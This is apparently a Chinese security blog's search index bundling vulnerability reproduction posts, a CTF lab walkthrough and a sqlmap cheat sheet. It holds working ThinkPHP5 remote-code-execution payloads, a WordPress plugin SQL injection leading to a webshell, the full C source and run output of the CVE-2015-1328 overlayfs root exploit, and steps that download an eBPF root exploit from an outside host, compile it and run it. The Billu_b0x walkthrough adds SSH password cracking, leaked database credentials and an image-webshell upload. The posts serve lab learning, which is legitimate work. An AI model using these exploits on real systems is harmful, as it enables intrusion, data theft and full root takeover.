<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Thinkphp5漏洞总结]]></title>
    <url>%2F2019%2F03%2F13%2Fthinkphp5%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[人生是个圆，有的人走了一辈子也没有走出命运画出的圆圈，其实，圆上的每一个点都有一条腾飞的切线。 ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞漏洞描述ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。 漏洞等级高级 漏洞危害远程代码执行 漏洞检测方法利用POC去试验是否存在该漏洞 漏洞利用方法启动docker环境: 1docker-compose up -d 然后修改URL中的参数,构造POC,成功执行命令 发送的数据包为: 1http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1` 也可以执行其他命令,只需替换vars[0]的值即可 漏洞修复方案:1,及时去thinkphp官网修补漏洞 2,更新到最新版 ThinkPHP5 5.0.23 远程代码执行漏洞漏洞描述ThinkPHP是一款运用极广的PHP开发框架。其5.0.23以前的版本中，在获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。 漏洞等级高级 漏洞危害远程代码执行 漏洞检测方法利用POC去试验是否存在该漏洞 漏洞利用方法启动docker环境: 1docker-compose up -d 然后刷新页面,构造POC,成功执行命令 发送的数据包为: 123456789101112POST /index.php?s=captcha HTTP/1.1Host: 192.168.136.128:8080User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 72_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id 也可以执行其他命令,只需替换server[REQUEST_METHOD]的值即可 漏洞修复方案:1,及时去thinkphp官网修补漏洞 2,更新到最新版 ThinkPHP5版本 SQL注入漏洞和敏感信息泄露漏洞漏洞描述ThinkPHP5版本存在一个鸡肋的SQL注入漏洞,可以获取到当前用户和密码以及数据库名等信息,详情参考:https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html 漏洞等级低危 漏洞危害获取到数据库配置信息(用户名,密码,数据库名,主机名) 漏洞检测方法利用POC去试验是否存在该漏洞 漏洞利用方法启动docker环境: 1docker-compose up -d 如果出现以下错误: 1ERROR: Get https://registry-1.docker.io/v2/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers) 那么需要去修改/etc/resolv.conf修改为: 123nameserver 8.8.8.8nameserver 8.8.4.4nameserver 10.0.0.10 访问以下URL进入网站,出现用户名表示成功访问: 1http://Your-Ip/index.php?ids[]=1&amp;ids[]=2 然后使用xpath报错的方法去构造POC,成功执行命令 请求的URL为: http://192.168.136.128/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1 1http://your-ip:8080/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1 漏洞修复方案:1,及时去thinkphp官网修补漏洞 2,更新到最新版]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WordPress插件注入漏洞]]></title>
    <url>%2F2019%2F03%2F05%2Fwordpress%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[最具挑战性的挑战莫过于提升自我。——迈克尔·F·斯特利 漏洞名称：WordPress Plugin Comment Rating 2.9.32 SQL注入漏洞 漏洞描述：wordpress中的comment-rating2.9.32插件中的ck-processkarma.php文件存在HTTP_X_FORWARDED_FOR header inject Vulnerability 漏洞等级高级 漏洞检测方法：wpscan扫描 漏洞利用方法： 浏览网页，发现是WordPress网站 2.使用wpscan进行扫描 1wpscan -u &quot;http://219.153.49.228:48606/&quot; --enumerate vp 得出comment-rating插件存在SQL注入漏洞 12345678910+] Name: comment-rating - v2.9.32 | Location: http://219.153.49.228:48606/wp-content/plugins/comment-rating/ | Readme: http://219.153.49.228:48606/wp-content/plugins/comment-rating/readme.txt[!] Directory listing is enabled: http://219.153.49.228:48606/wp-content/plugins/comment-rating/[!] Title: Comment Rating 2.9.32 - Security Bypass Weakness &amp; SQL Injection Reference: https://wpvulndb.com/vulnerabilities/6428 Reference: http://packetstormsecurity.com/files/120569/ Reference: https://secunia.com/advisories/52348/ Reference: https://www.exploit-db.com/exploits/24552/ 3.查看 https://www.exploit-db.com/exploits/24552/， 根据其介绍的知是HTTP_X_FORWARDED_FOR header注入漏洞。 123456789101112131415161718192021222324252627Vulnerable Code: /wp-content/plugins/comment-rating/ck-processkarma.phpFirst take the IP from HTTP_X_FORWARDED_FOR header.-----------------------------------------------------------------------48 $ip = getenv(&quot;HTTP_X_FORWARDED_FOR&quot;) ? getenv(&quot;HTTP_X_FORWARDED_FOR&quot;) : getenv(&quot;REMOTE_ADDR&quot;);49 if(strstr($row[&apos;ck_ips&apos;], $ip)) &#123;50 // die(&apos;error|You have already voted on this item!&apos;); 51 // Just don&apos;t count duplicated votes52 $duplicated = 1;53 $ck_ips = $row[&apos;ck_ips&apos;];54 &#125;Later made a UPDATE without filter the input.------------------------------------------------------------------------77 $query = &quot;UPDATE `$table_name` SET ck_rating_$direction = &apos;$rating&apos;, ck_ips = &apos;&quot; . $ck_ips . &quot;&apos; WHERE ck_comment_id = $k_id&quot;;So let&apos;s take a look in the DBmysql&gt; select * from wp_comment_rating;+---------------+----------------+--------------+----------------+| ck_comment_id | ck_ips | ck_rating_up | ck_rating_down |+---------------+----------------+--------------+----------------+| 2 | ,20.209.10.130 | 1 | 0 || 3 | | 0 | 0 |+---------------+----------------+--------------+----------------+2 rows in set (0.00 sec) 4.EDB提供的POC，但我本地尝试运行这个POC并未成功，所以构造语句，使用sqlmap进行查询 12345678910111213141516171819202122&lt;?PHPdefine(&apos;HOST&apos;,&apos;http://localhost/wordpress/&apos;);define(&apos;IDCOMMENT&apos;,2);$url=parse_url(HOST);define(&apos;URL&apos;,$url[&apos;path&apos;].&apos;wp-content/plugins/comment-rating/ck-processkarma.php?id=&apos;.IDCOMMENT.&apos;&amp;action=add&amp;path=a&amp;imgIndex=1_14_&apos;);for($i=0;$i&lt;1;$i++) lvlup();function lvlup()&#123; global $url; $header = &quot;GET &quot;.URL.&quot; HTTP/1.1 \r\n&quot;; $header.= &quot;Host: &quot;.$url[&apos;host&apos;].&quot;\r\n&quot;; $header.= &quot;Accept-Encoding: gzip, deflate \r\n&quot;; $header.= &quot;X-Forwarded-For: &quot;.long2ip(rand(0, &quot;4294967295&quot;)).&quot;\r\n&quot;; $header.= &quot;Connection: close \r\n\r\n&quot;; $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP); socket_connect($socket,$url[&apos;host&apos;], 80); socket_write($socket, $header); socket_close($socket);&#125;?&gt; 5.查询语句为： 1sqlmap &quot;http://219.153.49.228:40602/wp-content/plugins/comment-rating/ck-processkarma.php?id=1&amp;action=add&amp;path=a&amp;imgIndex=1_14_&quot; -f 然后查出库名，表名，列名，字段名，这个很简单，我就不多说啦。 6，然后登陆账号，在插件中添加PHP一句话木马，记得开启插件功能 7，菜刀连接木马即可获取shell. 漏洞修复方案：及时更新插件]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu本地提权漏洞复现]]></title>
    <url>%2F2019%2F03%2F03%2FUbuntu%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%2F</url>
    <content type="text"><![CDATA[知人者智，自知者明。胜人者有力，自胜者强。 ——老子 Ubuntu本地提权漏洞（CVE-2015-1328）漏洞原理：这个漏洞是因为在Ubuntu到15.04 之前的3.19.0-21.21 的linux（又名Linux内核）包中的overlayfs实现没有正确检查上层文件系统目录中的文件创建权限，这允许本地用户通过利用其中的配置来获取root访问权限。任意mount命名空间中都允许使用overlayfs。当在用户命名空间内使用overlayfs 挂载时，一名安全从业者Philip Pettersson发现了权限升级漏洞，本地用户即可利用此漏洞获取系统的管理权限。 报告中是这样说的： “当在上层文件系统目录中创建新文件时，overlayfs文件系统未能正确检查此文件的权限。而这一缺陷则可以被内核中没有权限的进程所利用，只要满足该进程CONFIG_USER_NS=y及overlayfs所拥有得FS_USERNS_MOUNT标志，即允许挂载非特权挂载空间的overlayfs。而这一条件是Ubuntu 12.04、14.04、14.10和15.04版本中的默认配置，所以这些版本的Ubuntu系统都受此漏洞影响。ovl_copy_up_ 函数未能正确检查用户是否有权限向upperdir目录写入文件。而该函数唯一检查的是被修改文件的拥有者是否拥有向upperdir目录写入文件的权限。此外，当从lowerdir目录复制一个文件时，同时也就复制了文件元数据，而并非文件属性，例如文件拥有者被修改为了触发copy_up_程序的用户。” 影响版本： Ubuntu Linux 15.04 Ubuntu Linux 14.10 Ubuntu Linux 14.04 Ubuntu Linux 12.04 漏洞复现：将下面POC代码存放到本地的一个文件内，也可以去EDB网站下载https://www.exploit-db.com/exploits/37292/。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152/*# Exploit Title: ofs.c - overlayfs local root in ubuntu# Date: 2015-06-15# Exploit Author: rebel# Version: Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15)# Tested on: Ubuntu 12.04, 14.04, 14.10, 15.04# CVE : CVE-2015-1328 (http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html)*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*CVE-2015-1328 / ofs.coverlayfs incorrect permission handling + FS_USERNS_MOUNTuser@ubuntu-server-1504:~$ uname -aLinux ubuntu-server-1504 3.19.0-18-generic #18-Ubuntu SMP Tue May 19 18:31:35 UTC 2015 x86_64 x86_64 x86_64 GNU/Linuxuser@ubuntu-server-1504:~$ gcc ofs.c -o ofsuser@ubuntu-server-1504:~$ iduid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),30(dip),46(plugdev)user@ubuntu-server-1504:~$ ./ofsspawning threadsmount #1mount #2child threads done/etc/ld.so.preload createdcreating shared library# iduid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),1000(user)greets to beist &amp; kaliman2015-05-24%rebel%*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=**/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sched.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/mount.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sched.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/mount.h&gt;#include &lt;sys/types.h&gt;#include &lt;signal.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;linux/sched.h&gt;#define LIB &quot;#include &lt;unistd.h&gt;\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n&#123;\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \&quot;getuid\&quot;);\nreadlink(\&quot;/proc/self/exe\&quot;, (char *) &amp;path, 128);\nif(geteuid() == 0 &amp;&amp; !strcmp(path, \&quot;/bin/su\&quot;)) &#123;\nunlink(\&quot;/etc/ld.so.preload\&quot;);unlink(\&quot;/tmp/ofs-lib.so\&quot;);\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\&quot;/bin/sh\&quot;, \&quot;sh\&quot;, \&quot;-i\&quot;, NULL, NULL);\n&#125;\n return _real_getuid();\n&#125;\n&quot;static char child_stack[1024*1024];static intchild_exec(void *stuff)&#123; char *file; system(&quot;rm -rf /tmp/ns_sploit&quot;); mkdir(&quot;/tmp/ns_sploit&quot;, 0777); mkdir(&quot;/tmp/ns_sploit/work&quot;, 0777); mkdir(&quot;/tmp/ns_sploit/upper&quot;,0777); mkdir(&quot;/tmp/ns_sploit/o&quot;,0777); fprintf(stderr,&quot;mount #1\n&quot;); if (mount(&quot;overlay&quot;, &quot;/tmp/ns_sploit/o&quot;, &quot;overlayfs&quot;, MS_MGC_VAL, &quot;lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper&quot;) != 0) &#123;// workdir= and &quot;overlay&quot; is needed on newer kernels, also can&apos;t use /proc as lower if (mount(&quot;overlay&quot;, &quot;/tmp/ns_sploit/o&quot;, &quot;overlay&quot;, MS_MGC_VAL, &quot;lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work&quot;) != 0) &#123; fprintf(stderr, &quot;no FS_USERNS_MOUNT for overlayfs on this kernel\n&quot;); exit(-1); &#125; file = &quot;.access&quot;; chmod(&quot;/tmp/ns_sploit/work/work&quot;,0777); &#125; else file = &quot;ns_last_pid&quot;; chdir(&quot;/tmp/ns_sploit/o&quot;); rename(file,&quot;ld.so.preload&quot;); chdir(&quot;/&quot;); umount(&quot;/tmp/ns_sploit/o&quot;); fprintf(stderr,&quot;mount #2\n&quot;); if (mount(&quot;overlay&quot;, &quot;/tmp/ns_sploit/o&quot;, &quot;overlayfs&quot;, MS_MGC_VAL, &quot;lowerdir=/tmp/ns_sploit/upper,upperdir=/etc&quot;) != 0) &#123; if (mount(&quot;overlay&quot;, &quot;/tmp/ns_sploit/o&quot;, &quot;overlay&quot;, MS_MGC_VAL, &quot;lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work&quot;) != 0) &#123; exit(-1); &#125; chmod(&quot;/tmp/ns_sploit/work/work&quot;,0777); &#125; chmod(&quot;/tmp/ns_sploit/o/ld.so.preload&quot;,0777); umount(&quot;/tmp/ns_sploit/o&quot;);&#125;intmain(int argc, char **argv)&#123; int status, fd, lib; pid_t wrapper, init; int clone_flags = CLONE_NEWNS | SIGCHLD; fprintf(stderr,&quot;spawning threads\n&quot;); if((wrapper = fork()) == 0) &#123; if(unshare(CLONE_NEWUSER) != 0) fprintf(stderr, &quot;failed to create new user namespace\n&quot;); if((init = fork()) == 0) &#123; pid_t pid = clone(child_exec, child_stack + (1024*1024), clone_flags, NULL); if(pid &lt; 0) &#123; fprintf(stderr, &quot;failed to create new mount namespace\n&quot;); exit(-1); &#125; waitpid(pid, &amp;status, 0); &#125; waitpid(init, &amp;status, 0); return 0; &#125; usleep(300000); wait(NULL); fprintf(stderr,&quot;child threads done\n&quot;); fd = open(&quot;/etc/ld.so.preload&quot;,O_WRONLY); if(fd == -1) &#123; fprintf(stderr,&quot;exploit failed\n&quot;); exit(-1); &#125; fprintf(stderr,&quot;/etc/ld.so.preload created\n&quot;); fprintf(stderr,&quot;creating shared library\n&quot;); lib = open(&quot;/tmp/ofs-lib.c&quot;,O_CREAT|O_WRONLY,0777); write(lib,LIB,strlen(LIB)); close(lib); lib = system(&quot;gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w&quot;); if(lib != 0) &#123; fprintf(stderr,&quot;couldn&apos;t create dynamic library\n&quot;); exit(-1); &#125; write(fd,&quot;/tmp/ofs-lib.so\n&quot;,16); close(fd); system(&quot;rm -rf /tmp/ns_sploit /tmp/ofs-lib.c&quot;); execl(&quot;/bin/su&quot;,&quot;su&quot;,NULL);&#125; 然后将其保存到本地的一个文件里去。 1234567891011121314ica@indishell:~$ chmod 777 Ubuntu_EXP.c //赋予文件权限ica@indishell:~$ gcc Ubuntu_EXP.c -o Ubuntu_EXP //编译程序ica@indishell:~$ lsUbuntu_EXP Ubuntu_EXP.cica@indishell:~$ ./Ubuntu_EXP //执行EXPspawning threadsmount #1mount #2child threads done/etc/ld.so.preload createdcreating shared library# id //检测提权是否成功uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),114(sambashare),1000(ica)# CVE-2017-16995 Ubuntu16.04本地提权漏洞漏洞描述Ubuntu 16.04版本存在本地提权漏洞，该漏洞存在于Linux内核带有的eBPF bpf(2)系统调用中，当用户提供恶意BPF程序使eBPF验证器模块产生计算错误，导致任意内存读写问题。 攻击者（普通用户）可以利用该漏洞进行提权攻击，获取root权限，危害极大。 目前，主要是Debian和Ubuntu版本受影响，Redhat和CentOS不受影响。 影响版本： Linux内核：Linux Kernel Version 4.4 ~ 4.14 Ubuntu版本：16.04.01~ 16.04.04 漏洞等级高危 漏洞危害提升到root权限 漏洞检测方法1.编译POC,运行判断是否存在 2.漏洞扫描器扫描 漏洞利用方法123456789101112131415$ whoami //查看当前用户hack$ wget http://cyseclabs.com/pub/upstream44.c //下载EXP$ lsupstream44.c$ gcc -o exp upstream44.c //编译并输出到exp应用程序中$ chmod 777 exp //赋予权限$ ./exp //执行task_struct = ffff880015e9f000uidptr = ffff88001d42b5c4spawning root shellroot@mozhe:~# lsexp upstream44.croot@mozhe:~# id //以获取权限uid=0(root) gid=0(root) groups=0(root),1001(hack) 漏洞修复方案1.及时升级系统 2.去官网打补丁]]></content>
      <categories>
        <category>主机安全</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF综合靶机（Billu_b0x）渗透测试]]></title>
    <url>%2F2019%2F03%2F03%2FCTF%E9%9D%B6%E6%9C%BA%2F</url>
    <content type="text"><![CDATA[很多东西放到时间里去看就能看清楚。要么越走越远，要么越走越近。 下载地址： 链接：https://pan.baidu.com/s/1qaffdiwOFN8sI_qWJp1jlg提取码：kger复制这段内容后打开百度网盘手机App，操作更方便哦 使用VMware打开虚拟机，设置网络为仅主机模式即可 发现目标：使用nmap的-sP参数去探测在当前局域网内存活的主机 123456789101112131415161718192021222324252627root@kali:~# nmap -sP 192.168.149.0/24Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-03 16:49 CSTNmap scan report for 192.168.149.1Host is up (0.00036s latency).MAC Address: 00:50:56:C0:00:01 (VMware) Nmap scan report for 192.168.149.132 //靶机地址Host is up (0.00019s latency).MAC Address: 00:0C:29:E8:DA:C7 (VMware)Nmap scan report for 192.168.149.254 //网关地址Host is up (0.00091s latency).MAC Address: 00:50:56:F5:FB:82 (VMware)Nmap scan report for 192.168.149.131 //kali主机地址Host is up.Nmap done: 256 IP addresses (4 hosts up) scanned in 28.11 seconds 使用nmap的-sV扫描目标系统开放的服务，-p-表示对目标系统全部端口进行扫描，–script=banner表示使用nmap中的脚本去扫描目标系统的服务版本信息 123456789101112131415root@kali:~# nmap -sV -p- --script=banner 192.168.149.132Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-03 17:20 CSTNmap scan report for 192.168.149.132Host is up (0.0012s latency).Not shown: 65533 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)|_banner: SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.480/tcp open http Apache httpd 2.2.22 ((Ubuntu))|_http-server-header: Apache/2.2.22 (Ubuntu)MAC Address: 00:0C:29:E8:DA:C7 (VMware)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 38.04 seconds 发现目标系统只开放了22端口和80端口，那么先从80端口尝试一番 探测SQL注入漏洞：通过浏览器访问目标系统的80端口，出现下面的页面，需要展示SQL注入技巧，尝试了几个SQL万能密码都没办法成功，那么可以用sqlmap跑一跑，可能能跑出结果 因为使用burpsuite抓包的值是post类型的数据包，所以我们设置的sqlmap命令为： 1sqlmap.py -u &quot;http://192.168.149.132/&quot; --data=&quot;un=admin&amp;ps=123456&amp;login=let%27s+login&quot; --dbms=&quot;mysql&quot; --level=3 --batch 但是跑了好久也没有跑出来，只能换一种方法 目录爆破：试试目录爆破获取可以获取到有用的信息 我平时在Windows下使用的是御剑，kali 中用得是dirb和dirbuster 123456789101112131415161718192021222324252627282930313233343536root@kali:~# dirb http://192.168.149.132-----------------DIRB v2.22 By The Dark Raver-----------------START_TIME: Sun Mar 3 18:03:34 2019URL_BASE: http://192.168.149.132/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612 ---- Scanning URL: http://192.168.149.132/ ----+ http://192.168.149.132/add (CODE:200|SIZE:307) + http://192.168.149.132/c (CODE:200|SIZE:1) + http://192.168.149.132/cgi-bin/ (CODE:403|SIZE:291) + http://192.168.149.132/head (CODE:200|SIZE:2793) ==&gt; DIRECTORY: http://192.168.149.132/images/ + http://192.168.149.132/in (CODE:200|SIZE:47559) + http://192.168.149.132/index (CODE:200|SIZE:3267) + http://192.168.149.132/index.php (CODE:200|SIZE:3267) + http://192.168.149.132/panel (CODE:302|SIZE:2469) + http://192.168.149.132/server-status (CODE:403|SIZE:296) + http://192.168.149.132/show (CODE:200|SIZE:1) + http://192.168.149.132/test (CODE:200|SIZE:72) ---- Entering directory: http://192.168.149.132/images/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode &apos;-w&apos; if you want to scan it anyway) -----------------END_TIME: Sun Mar 3 18:03:38 2019DOWNLOADED: 4612 - FOUND: 11 当访问到test文件时，系统提示： 1&apos;file&apos; parameter is empty. Please provide file path in &apos;file&apos; parameter 文件包含：那么可以得出test文件内有一个文件包含函数，那么这里很有可能有个文件包含漏洞 原先构造URL为： 1http://192.168.149.132/test?file=/etc/passwd 发现没有反应，那么可能需要构造post类型数据包 由passwd我们可以得出当时可以登录的账号为root和ica用户 我们可以使用hydra进行爆破试试 1hydra -l root -P /root/dict/1433-pass.txt -T 6 192.168.149.132 ssh 当然hydra是可以爆破成功的，只要字典强大，爆出root密码为roottoor。这个等会用。 我们将刚刚爆破出来的文件一一下载看看里面有没有其他有用的内容 当在查看c.php文件时，发现其存在mysql数据库的账号和密码和数据库名。我们即可以通过数据库连接软件去连接 1234567891011121314151617&lt;?php#header( &apos;Z-Powered-By:its chutiyapa xD&apos; );header(&apos;X-Frame-Options: SAMEORIGIN&apos;);header( &apos;Server:testing only&apos; );header( &apos;X-Powered-By:testing only&apos; );ini_set( &apos;session.cookie_httponly&apos;, 1 );$conn = mysqli_connect(&quot;127.0.0.1&quot;,&quot;billu&quot;,&quot;b0x_billu&quot;,&quot;ica_lab&quot;);// Check connectionif (mysqli_connect_errno()) &#123; echo &quot;connection failed -&gt; &quot; . mysqli_connect_error(); &#125;?&gt; 获得网站账号biLLu，密码hEx_it，然后成功登陆 在网站发现可以添加用户，并能上传图片，发现只能上传图片文件的后缀才可以，显然网站设置了白名单。 获取shell：我们之前查看test文件包含的时候，下载了panel.php文件，这个文件也存在文件包含的功能 1234567891011121314151617181920212223if(isset($_POST[&apos;continue&apos;]))&#123; $dir=getcwd(); $choice=str_replace(&apos;./&apos;,&apos;&apos;,$_POST[&apos;load&apos;]); if($choice===&apos;add&apos;) &#123; include($dir.&apos;/&apos;.$choice.&apos;.php&apos;); die(); &#125; if($choice===&apos;show&apos;) &#123; include($dir.&apos;/&apos;.$choice.&apos;.php&apos;); die(); &#125; else &#123; include($dir.&apos;/&apos;.$_POST[&apos;load&apos;]); &#125; &#125; 那我们上传一个图片马上去，然后使用panel.php包含这个文件，成功获取到 刚刚在网上找这类靶机的文章，发现一位大佬爆破出phpmy目录，然后通过猜解路径去下载，这个文件默认路径在/var/www/phpmy下面，那么我们还可以通过文件包含下载这个文件，然后获取到root账号和密码 12345678910111213141516171819202122232425262728293031323334&lt;?php/* Servers configuration */$i = 0;/* Server: localhost [1] */$i++;$cfg[&apos;Servers&apos;][$i][&apos;verbose&apos;] = &apos;localhost&apos;;$cfg[&apos;Servers&apos;][$i][&apos;host&apos;] = &apos;localhost&apos;;$cfg[&apos;Servers&apos;][$i][&apos;port&apos;] = &apos;&apos;;$cfg[&apos;Servers&apos;][$i][&apos;socket&apos;] = &apos;&apos;;$cfg[&apos;Servers&apos;][$i][&apos;connect_type&apos;] = &apos;tcp&apos;;$cfg[&apos;Servers&apos;][$i][&apos;extension&apos;] = &apos;mysqli&apos;;$cfg[&apos;Servers&apos;][$i][&apos;auth_type&apos;] = &apos;cookie&apos;;$cfg[&apos;Servers&apos;][$i][&apos;user&apos;] = &apos;root&apos;;$cfg[&apos;Servers&apos;][$i][&apos;password&apos;] = &apos;roottoor&apos;; //root密码$cfg[&apos;Servers&apos;][$i][&apos;AllowNoPassword&apos;] = true;/* End of servers configuration */$cfg[&apos;DefaultLang&apos;] = &apos;en-utf-8&apos;;$cfg[&apos;ServerDefault&apos;] = 1;$cfg[&apos;UploadDir&apos;] = &apos;&apos;;$cfg[&apos;SaveDir&apos;] = &apos;&apos;;/* rajk - for blobstreaming */$cfg[&apos;Servers&apos;][$i][&apos;bs_garbage_threshold&apos;] = 50;$cfg[&apos;Servers&apos;][$i][&apos;bs_repository_threshold&apos;] = &apos;32M&apos;;$cfg[&apos;Servers&apos;][$i][&apos;bs_temp_blob_timeout&apos;] = 600;$cfg[&apos;Servers&apos;][$i][&apos;bs_temp_log_threshold&apos;] = &apos;32M&apos;;?&gt; Ubuntu本地提权：那么使用xshell去远程连接目标服务器， 12345root@indishell:~# uname -aLinux indishell 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linuxroot@indishell:~# cat /etc/issueUbuntu 12.04.5 LTS \n \l 看到是Ubuntu12.04版本的，那么可以利用Ubuntu著名的本地提权exp 下载地址：https://www.exploit-db.com/exploits/37292 将EXP代码保存带文件内，然后赋予权限，进行编译 1234567891011121314151617181920root@indishell:~# vim exp.croot@indishell:~# chmod 777 exp.c //赋予权限root@indishell:~# gcc exp.c -o exp //编译root@indishell:~# ls exp exp.croot@indishell:~# mv exp /home/ica/ root@indishell:~# su - ica //由于是复现，我们切换用户为ica进行本地越权ica@indishell:~$ica@indishell:~$ lsexpica@indishell:~$ ./exp //执行EXPspawning threadsmount #1mount #2child threads done/etc/ld.so.preload createdcreating shared library# iduid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),114(sambashare),1000(ica) //成功越权#]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>靶机实验</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQLMAP速查表]]></title>
    <url>%2F2019%2F03%2F03%2FSQLMAP%2F</url>
    <content type="text"><![CDATA[时光匆匆流逝过，平平淡淡才是真。忍耐任由风雨过，守得云开见月明。 注：由于自己sqlmap命令不是很熟，经常只会使用常见的那几个参数，所以特地写了博客，将所有的命令一个一个的操作了一遍，然后码字，过程是辛苦的，但收货满满，很开心，晚安，世界！ 简介：SQLMAP是开源的渗透测试工具，主要用于自动化监测和利用SQL注入漏洞，它具有功能强大的检测引擎，能针对各种不同类型的数据库去获取数据库服务器的权限，获取数据库所存储的数据，访问并且可以导出操作系统的文件，甚至通过外带数据连接的方式执行操作系统命令。 所支持的DBMS：SQLMAP支持市面上常见的DBMS，包括MySQL，Oracle，PostgreSQL，Microsoft SQL Server，Microsoft Access，IBM DB2，SQLite，Firebird)和SAP MaxDB。 五种注入模式： 基于布尔的盲注，即可以根据返回页面判断条件真假的注入。 基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟是否执行（即页面返回时间是否增加）来判断。 基于报错注入，即页面会返回错误信息，或者把注入的语句直接返回在页面中。 联合查询注入，在使用union联合查询的情况下注入 堆查询注入，可以在同时执行多条语句的情况下注入 七种测试等级：使用参数-v指定对应的测试等级，默认是等级1.如果想看到sqlmap发送的测试payload最好的等级是3,。 1234567·0：只显示Python的回溯、错误和关键消息；·1：同时显示基本信息和警告信息；·2：同时显示调试信息；·3：同时显示注入的payload；·4：同时显示HTTP请求；·5：同时显示HTTP响应头；·6：同时显示HTTP响应页面页面。 基本功能：1.在sqlmap 0.8版本之后，提供了数据库直连的功能，使用参数-d作为SQL数据库的客户端程序来连接数据库的端口，需要安装一些python中的依赖库便可以进行访问，其语法格式为： 1sqlmap.py -d &quot;DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME&quot; 2.与BurpSuite，Google结合使用，支持正则表达式限定测试目标 3.可以对HTTP头部信息（GET,POST,Cookie,Referer,User-Agent等）进行自动注入或者手动注入。 ​ 另外Referer和User-Agent可以具体指定某一个值去进行SQL注入挖掘 ​ 如果cookie过期之后，sqlmap会自动处理set-cookie头，更新cookie的信息 4.进行限速处理：设置最大并发和延迟发送。 5.支持基本身份认证（Basic Authentication），摘要认证（Digest Authentication），NTLM认证，CA身份认证 6.能够进行数据库版本的发现，用户的发现，进行提权，hash枚举和字典破解，暴力破解表列名称 7.能够利用SQL注入进行文件上传下载，支持用户定义函数（UDF）利用存储过程执行存储过程，执行操作系统命令，访问Windows注册表 8.与w3af,metasploit集成结合使用，能够基于数据库进程进行提权和上传执行后门。 下载地址：http://sqlmap.org/ 操作选项:基本操作：1234567-h:显示帮助信息退出--hh:显示更多的信息并退出--version：显示程序版本并退出-v:设置等级，默认为等级1 